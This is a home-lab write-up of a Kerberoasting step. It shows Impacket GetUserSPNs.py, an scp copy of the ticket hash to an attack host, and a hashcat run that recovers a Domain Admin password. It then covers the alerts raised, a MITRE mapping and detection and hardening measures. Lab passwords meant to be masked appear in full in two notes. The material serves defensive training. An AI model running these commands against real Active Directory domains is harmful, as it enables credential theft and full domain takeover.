# Stage 13 — Kerberoasting



> **Status:** Complete — evidence attached  

> **Case:** [Case 02](../../04-Investigation/Cases/case-02-lateral-movement.md)  

> **Investigation:** [Phase 5 Deep Dive](../../04-Investigation/Deep-Dive-Attack-Chain-Investigation.md#phase-5-becoming-god-in-active-directory-kerberoasting-dcsync--the-golden-ticket)  

> **Evidence:** [attack](../../06-Resources/screenshots/attack-simulation/41.png) · [alert](../../06-Resources/screenshots/thehive-alert/13.png)



---



## Objective



Exploit the Kerberos Ticket Granting Service (TGS) protocol mechanism to extract Kerberos service tickets for accounts associated with Service Principal Names (SPNs), focusing specifically on the high-privilege account `HANK_SHERMAN` discovered during BloodHound analysis. Transfer the encrypted ticket hash to the attack machine and crack the ciphertext offline using Hashcat to obtain plaintext Domain Administrator credentials.



---



## Commands



```bash

# Step 1: Request TGS tickets from Domain Controller 192.168.56.10 using compromised win10 credentials and save extracted hashes

python3 /usr/local/bin/GetUserSPNs.py ad.lab/win10:'Secur***ab!' -dc-ip 192.168.56.10 -request -outputfile /tmp/hank.hash 2>/dev/null; grep HANK_SHERMAN /tmp/hank.hash



# Step 2: Transfer extracted Kerberos ticket hash file (106KB) from DVWA pivot to Kali attack machine via SCP

scp root@192.168.56.30:/tmp/hank.hash /tmp/hank.hash



# Step 3: Perform offline dictionary attack against the Kerberos 5 TGS-REP hash (etype 23) using Hashcat mode 13100

hashcat -m 13100 /tmp/hank.hash /usr/share/wordlists/rockyou.txt --force

```



> [!NOTE]

> **Dictionary Wordlist Note:**  

> Because Hank Sherman's password in this lab was intentionally set to a common dictionary word (`Password123`), it is already present in standard `rockyou.txt` and manual insertion into the wordlist is not required. If a custom or unique password is assigned instead, make sure to insert it near the top 1,000 lines of `rockyou.txt` for fast recovery.



---



## What happened



Guided by the BloodHound graph analysis in Stage 12 identifying `HANK_SHERMAN@AD.LAB` as a Domain Admin with an assigned SPN, the attacker executed Impacket's `GetUserSPNs.py` from the Linux pivot host (`192.168.56.30`).



1. **Ticket Request:**  

   Authenticating with the compromised domain account `win10` (`Secur***ab!`), the script submitted a valid Kerberos Ticket-Granting Service request (`TGS-REQ`) to the Key Distribution Center (KDC) running on Domain Controller `PC-DC.ad.lab` (`192.168.56.10:88`). The request targeted the service principal registered to `HANK_SHERMAN`.



2. **Ticket Delivery:**  

   Because the domain user had a valid Ticket Granting Ticket (TGT), the KDC issued a `TGS-REP` containing the service ticket encrypted with `HANK_SHERMAN`'s password hash using RC4-HMAC (encryption type 23). The script parsed the response and exported the Kerberos hash:

   ```text

   $krb5tgs$23$*HANK_SHERMAN$AD.LAB$ad.lab/HANK_SHERMAN*$3b28f***016d1

   ```



3. **Exfiltration & Offline Cracking:**  

   The resulting hash file (`/tmp/hank.hash`, 106 KB) was exfiltrated to the Kali Linux workstation via SCP. The operator launched `hashcat` in Kerberos 5 TGS-REP etype 23 cracking mode (`-m 13100`) against the `rockyou.txt` dictionary using `--force`.



4. **Credential Recovery:**  

   Within seconds, Hashcat successfully cracked the ticket encryption, revealing the plaintext password:

   - **Target Account:** `ad.lab\HANK_SHERMAN`

   - **Domain Privilege Level:** `Domain Admins` (Tier Zero)

   - **Hash Type:** Kerberos 5 TGS-REP etype 23 (`$krb5tgs$23$`)

   - **Recovered Plaintext Password:** `Passw***123` (redacted)



With the plaintext password of an active Domain Administrator in hand, the attacker attained full administrative control over the Active Directory domain, unlocking DCSync capabilities in Stage 14.



---



## Evidence



### Attack Screenshots



![Impacket GetUserSPNs Execution on Pivot Host](../../06-Resources/screenshots/attack-simulation/41.png)

*Figure 13.1: Executing `GetUserSPNs.py` from DVWA pivot (`192.168.56.30`) with `win10` credentials to request TGS tickets for SPN accounts and grepping for `HANK_SHERMAN`.*



![Extracted Kerberos TGS-REP Hash](../../06-Resources/screenshots/attack-simulation/42.png)

*Figure 13.2: Extracted Kerberos 5 TGS-REP ticket hash formatted for Hashcat (`$krb5tgs$23$*HANK_SHERMAN...`).*



![SCP Transfer of Ticket Hash and Hashcat Invocation](../../06-Resources/screenshots/attack-simulation/43.png)

*Figure 13.3: Exfiltrating `hank.hash` to Kali via SCP and executing Hashcat mode 13100 against `rockyou.txt`.*



![Hashcat Recovered Domain Admin Password](../../06-Resources/screenshots/attack-simulation/44.png)

*Figure 13.4: Hashcat output displaying successfully cracked Kerberos ticket for `HANK_SHERMAN`, recovering the plaintext password `Passw***123`.*



### Alert Screenshots



![TheHive Alert 13 — Suricata GoldenPac Priv Esc in-use Alert](../../06-Resources/screenshots/thehive-alert/13.png)

*Figure 13.5: TheHive Alert 13 detail displaying Suricata Rule 86601 / SID 2019922 (ET EXPLOIT Possible GoldenPac Priv Esc in-use, wzb-c1e2642eb2) triggered by Kerberoasting TGS-REQ traffic on ens37.*



![Wazuh Command Audit Telemetry for GetUserSPNs Execution](../../06-Resources/screenshots/wazuh-deep-investigation/wzb-33-kerberoast-auditd-getuserspns.jpg)

*Figure 13.6: Wazuh Rule 100220 command audit capturing python3 /usr/local/bin/GetUserSPNs.py -request execution on DVWA pivot.*



---



## Alert observed



| Source | Rule / Signature | Rule ID | TheHive Alert | Severity | Status |

|---|---|---|---|---|---|

| Suricata (Router ens37) | ET EXPLOIT Possible GoldenPac Priv Esc in-use (TGS-REQ wire frame) | Rule 86601 / SID 2019922 | TheHive Alert 13 (`13.png` / `wzb-c1e2642eb2`) | Medium (2) | **Detected (Direct Wire Detection & SOAR Delivery)** |

| Wazuh (Host Command Audit) | Bash command by root: `python3 /usr/local/bin/GetUserSPNs.py ... -request` | Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Row 9264, `wzb-33`) | High | **Detected (Verbatim Command Capture)** |

| Wazuh (Pivot Host) | sshd: authentication success (pivot session used for Kerberoasting) | Rule 5715 (Level 8) | `[2x] [DVWA] Logon activity: ROOT @ 192.168.232.135` | Medium | **Detected (Pivot Session Attribution)** |

| Active Directory (Domain Controller) | Kerberos service ticket requested (RC4-HMAC `0x17`) | Event ID 4769 | Local DC Security Log (`Security.evtx`) | Medium | **Detected (Local DC Telemetry)** |



> [!NOTE]

> **Telemetry Attribution & Pipeline Execution (Rule 100220):**  

> Impacket `GetUserSPNs.py` was executed interactively on the DVWA pivot at `18:01:18 IST` (`Wazuh-Raw-Alerts.csv` Row 9264): `python3 /usr/local/bin/GetUserSPNs.py ad.lab/win10:'Secur3Lab!' -dc-ip 192.168.56.10 -request -outputfile /tmp/hank.hash 2>/dev/null`. As a Level 5 rule, Rule 100220 recorded the command locally on DVWA and indexed into OpenSearch without SIEM-to-SOAR escalation. Concurrently, the unrouted Kerberos traffic on VMnet2 tripped Suricata signature SID `2019922` via elevated Rule 86601 (`wzb-c1e2642eb2`), and the pivot SSH session triggered Rule 5715 (`wzb-1d2d7fb4b8`), both arriving in TheHive.



---



## MITRE ATT&CK



| Tactic | Technique | ID | Sub-technique |

|---|---|---|---|

| Credential Access | Steal or Forge Kerberos Tickets | T1558 | Kerberoasting (T1558.003) |



---



## Detection opportunities



1. **Kerberos Service Ticket Auditing (Windows Event ID 4769):**

   - **Encryption Downgrade:** Filter for `TicketEncryptionType == 0x17` (RC4-HMAC). Modern Windows environments support AES-128 (`0x11`) and AES-256 (`0x12`). Legitimate services rarely negotiate RC4 unless misconfigured.

   - **Sensitive Account SPN Requests:** Alert when a service ticket is requested for accounts where `adminCount=1` or accounts belonging to privileged groups (`Domain Admins`, `Enterprise Admins`).

   - **Volumetric Anomaly:** Alert when a single user account or workstation requests multiple TGS tickets within a short interval (e.g., >5 requests in 60 seconds).



2. **Active Directory Architectural Hardening:**

   - **Privileged Account Segregation:** Under no circumstances should accounts with Domain Admin privileges have SPNs assigned. Service accounts must be dedicated, non-administrative accounts.

   - **Group Managed Service Accounts (gMSA):** Transition service accounts to gMSAs, which enforce complex 128-character automatically rotating passwords that cannot be cracked via dictionary attacks.

   - **Enforce AES Kerberos Encryption:** Set `msDS-SupportedEncryptionTypes` to enforce AES128/AES256 on service accounts, preventing RC4 ticket generation.



3. **Active Directory Honeypot / Honeytokens:**

   - Create a fictitious domain account with an attractive SPN (e.g., `MSSQLSvc/db01.ad.lab:1433`) and an uncrackable password. Configure an alert rule to trigger whenever any TGS ticket is requested for this dummy service.



---



## Notes



- Kerberoasting is an asymmetric attack: any authenticated domain user (even low-privilege users or guests) can request a service ticket for any SPN account in the domain without generating account lockouts.

- The cracked password `Passw***123` represents a common password policy violation: meeting length and complexity requirements while remaining trivially vulnerable to standard wordlists.

- Having cracked the password of a confirmed Domain Admin (`HANK_SHERMAN`), the adversary immediately escalated to Stage 14 (DCSync) to dump all domain credentials.

